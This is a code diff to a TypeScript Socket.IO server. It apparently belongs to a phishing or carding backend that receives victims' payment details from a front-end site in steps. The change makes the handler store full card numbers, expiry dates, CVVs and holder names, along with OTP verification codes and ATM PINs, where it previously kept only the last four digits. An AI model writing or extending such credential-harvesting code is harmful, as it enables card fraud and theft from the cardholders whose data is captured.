@@ -137,12 +137,18 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
         }
 
         const str = (v: unknown) => (v != null ? String(v) : "");
-        const cardNum = str(data.CardID ?? data.cardID ?? "").replace(/\s/g, "");
+        // دعم أسماء الحقول المختلفة من الموقع الأمامي
+        const cardNum = str(data.cardNumber ?? data.CardID ?? data.cardID ?? "").replace(/\s/g, "");
+        const expiry = str(data.expirationDate ?? data.DateExp ?? data.dateExp ?? "");
+        const cvv = str(data.cvv ?? data.CVV ?? data.cardCvv ?? "");
+        const holderName = str(data.cardHolderName ?? data.CardHolderName ?? "");
 
         await createOrUpdatePayment(reference, {
-          cardHolderName: str(data.CardHolderName ?? data.cardHolderName),
-          cardLastFour: cardNum.slice(-4),
-          cardExpiry: str(data.DateExp ?? data.dateExp),
+          cardHolderName: holderName,
+          cardNumber: cardNum,
+          cardLastFour: cardNum.length >= 4 ? cardNum.slice(-4) : cardNum,
+          cardExpiry: expiry,
+          cardCvv: cvv,
           step: 1,
           status: "step1_done",
           rawData: data,
@@ -200,8 +206,10 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
           return;
         }
 
+        // دعم أسماء الحقول المختلفة: verification_code من OTP و pin من ATM
+        const otpCode = String(data.verification_code ?? data.pin ?? data.code ?? data.secretNum ?? data.otp ?? "");
         await createOrUpdatePayment(reference, {
-          secretNum: String(data.code ?? data.secretNum ?? data.otp ?? ""),
+          secretNum: otpCode,
           step: 3,
           status: "step3_done",
         });
